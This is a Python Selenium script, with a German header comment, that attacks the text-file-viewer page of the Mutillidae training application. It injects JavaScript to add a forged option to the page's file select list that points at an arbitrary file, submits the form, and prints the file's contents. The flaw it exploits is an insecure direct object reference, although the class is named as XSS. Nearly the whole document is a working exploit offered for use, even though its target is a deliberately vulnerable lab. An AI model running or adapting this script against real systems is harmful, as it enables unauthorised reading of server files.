##### Fueegt der Select-Form auf der "text-file-viewer.php"-Seite einen neuen Eintrag hinzu #####


from selenium import webdriver
from selenium.webdriver.support.ui import Select
from bs4 import BeautifulSoup
from prettytable import PrettyTable
import sys, time
import optparse

class InsecObjectXSS:
	objref = "C:eula.1028.txt"
	java_script = "var elSel = document.getElementById('%s'); var elOptNew = document.createElement('option'); elOptNew.text = 'hack'; elOptNew.value = '%s'; var elOptOld = elSel.options[elSel.selectedIndex];  elSel.add(elOptNew, elOptOld);"

	def __init__(self, url):
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:
			print " [-] Openning '%s'\n"%(self.url+"/index.php?page=text-file-viewer.php")
			self.browser.get(self.url+"/index.php?page=text-file-viewer.php")
			self.__wait()
			
			print " [-] Trying to get '%s'\n"%InsecObjectXSS.objref
			
			self.browser.execute_script(InsecObjectXSS.java_script%("id_textfile_select", InsecObjectXSS.objref))
				
			select = Select(self.browser.find_element_by_id('id_textfile_select'))
			select.select_by_visible_text('hack')

			btn = self.browser.find_element_by_name('text-file-viewer-php-submit-button')
			btn.click()
			self.__wait()

			page_src = self.browser.page_source
			
			soup = BeautifulSoup(page_src, "lxml")
			objdata = soup.find("form").findNext("pre").get_text()

			print " [*] Attack was successful, printing data from '%s' ...\n"%InsecObjectXSS.objref
			print objdata
		except Exception, e:
			print " [!] Attack was not successfull, error:", e

def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = InsecObjectXSS(options.url)
	attacker.attack()
#	attacker.close()

if __name__ == "__main__":
	main()
